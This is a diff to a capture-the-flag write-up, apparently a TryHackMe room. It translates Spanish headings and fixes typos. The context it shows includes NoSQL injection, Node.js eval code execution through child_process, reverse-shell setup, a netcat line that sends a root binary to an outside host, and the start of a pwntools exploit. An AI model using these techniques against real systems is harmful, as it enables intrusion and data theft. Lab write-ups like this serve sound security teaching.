@@ -38,9 +38,9 @@ feroxbuster -u https://$TARGET -w /usr/share/seclists/Discovery/Web-Content/raft
 200      GET       15l       23w      215c http://10.128.165.55/admin/register
 ```
 
-## Visitamos /admin es un panel de login 
-## Vistitamos /admin/register 
-> dice que esta desactivado de momento podriamos intentar registar un usuario con una peticion post
+## Visiting `/admin` shows a login panel
+## Visiting `/admin/register`
+> The page says registration is disabled for now, but a direct POST request is still worth testing.
 ```bash
 curl -X POST http://$TARGET/admin/register \
   -H "Content-Type: application/json" \
@@ -51,7 +51,7 @@ curl -X POST http://$TARGET/admin/register \
 ```
 Found. Redirecting to /admin#Registered%20successfully!
 ```
-## No nos redirige a un panel pero no podemos ejecutar nada 
+## The request does not redirect us to a usable panel yet
 
 ## Let's try to get access with dave account with some nosql injection
 ```bash
@@ -82,7 +82,7 @@ require('fs').readdirSync('/')
 #Output:  bin,boot,cdrom,dev,etc,home,initrd.img,initrd.img.old,lib,lib64,lost+found,media,mnt,opt,proc,root,run,sbin,snap,srv,swap.img,sys,tmp,uid_checker,usr,var,vmlinuz,vmlinuz.old
 ```
 
-## The server executes a node funcion eval o something similar so we can exploit this to read files or execute commands
+## The server evaluates Node.js expressions or something similar, so we can abuse it to read files or execute commands
 ```bash
 require('child_process').execSync('whoami')
 ```
@@ -92,7 +92,7 @@ require('child_process').execSync('whoami')
 dave
 ```
 
-### Let's try to establish a reverse shell conection
+### Let's try to establish a reverse shell connection
 ```bash
 require('child_process').execSync('echo $SHELL')
 # dave user uses a sh shell
@@ -135,7 +135,7 @@ db.whatcouldthisbes.find().pretty()
 }
 ```
 
-## Priviesc
+## Privilege Escalation
 ```bash
 sudo -l
 ```
@@ -144,7 +144,7 @@ sudo -l
 (root) NOPASSWD: /uid_checker
 ```
 
-### let's find out waht is this binary
+### Let's find out what this binary is
 ```bash
 strings /uid_checker
 ```
@@ -159,15 +159,15 @@ Wow! You found the secret function! I still need to finish it..
 Invalid choice                                                                              
 ;*3$"                                                          
 ```
-## let's transfer the binary to our machine
+## Transfer the binary to our machine
 ```bash
 ## output:  uid 0
-# Let's revese engineering the binary with ghydra
+# Reverse engineer the binary with Ghidra
 nc -lvnp 4444 > uid_checker
 cat /uid_checker | nc 192.168.130.5 4444
 ```
 
-## First create a new project with idra import the file and analyze it
+## First, create a new Ghidra project, import the file and analyze it
 ```
 void main(void)
 
@@ -270,7 +270,7 @@ THM{...}
 
 ```
 
-### Exploit completo
+### Complete Exploit
 ```python
 from pwn import cyclic
 from pwnlib.tubes.ssh import ssh
